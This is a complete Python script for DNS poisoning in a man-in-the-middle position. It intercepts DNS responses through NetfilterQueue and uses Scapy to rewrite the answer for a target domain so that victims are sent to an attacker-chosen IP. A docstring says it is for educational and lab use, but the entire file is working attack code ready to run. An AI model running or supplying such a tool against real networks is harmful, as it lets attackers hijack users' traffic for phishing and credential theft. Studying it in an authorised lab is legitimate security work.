#!/usr/bin/env python3
"""
DNS Spoofer – Man-in-the-Middle DNS Poisoning (Educational & Lab Use Only)

This script:
- Binds to NetfilterQueue queue 0
- Intercepts DNS response packets
- If the queried domain matches TARGET_DOMAIN, it rewrites the answer (A record)
  to point to FAKE_IP.
"""

import netfilterqueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR

# ===================== Configuration =====================

# Domain to spoof (must include trailing dot because DNSQ.qname does)
TARGET_DOMAIN = b"www.example.com."
# IP address to which the victim will be redirected
FAKE_IP = "192.168.1.100"

# =========================================================


def process_packet(packet):
    """
    Callback for each packet received from NFQUEUE.
    """
    scapy_packet = IP(packet.get_payload())

    # Check if this packet has a DNS response layer
    if scapy_packet.haslayer(DNSRR) and scapy_packet.haslayer(DNSQR):
        qname = scapy_packet[DNSQR].qname

        # Check if the query name contains our target domain
        if TARGET_DOMAIN in qname:
            try:
                decoded_qname = qname.decode(errors="ignore")
            except Exception:
                decoded_qname = str(qname)

            print(f"[+] Intercepted DNS response for: {decoded_qname}")
            print(f"[+] Spoofing {decoded_qname} -> {FAKE_IP}")

            # Create a forged DNS answer
            answer = DNSRR(rrname=qname, rdata=FAKE_IP)

            # Replace the original answer with our forged one
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            # Remove length and checksum fields so Scapy recalculates them
            if scapy_packet.haslayer(IP):
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum

            if scapy_packet.haslayer(UDP):
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum

            # Set the modified packet payload
            packet.set_payload(bytes(scapy_packet))

    # Accept the (possibly modified) packet
    packet.accept()


def main():
    """
    Main entry point: bind to NFQUEUE and start processing packets.
    """
    print("[*] DNS Spoofer starting...")
    try:
        print(f"[*] Target domain : {TARGET_DOMAIN.decode(errors='ignore')}")
    except Exception:
        print(f"[*] Target domain : {TARGET_DOMAIN}")
    print(f"[*] Fake IP        : {FAKE_IP}")
    print("[*] Binding to NFQUEUE number 0. Press Ctrl+C to stop.\n")

    queue = netfilterqueue.NetfilterQueue()

    try:
        # Bind to queue number 0 (must match your iptables rule)
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Exiting...")
    finally:
        queue.unbind()
        print("[*] NFQUEUE unbound. Bye!")


if __name__ == "__main__":
    main()
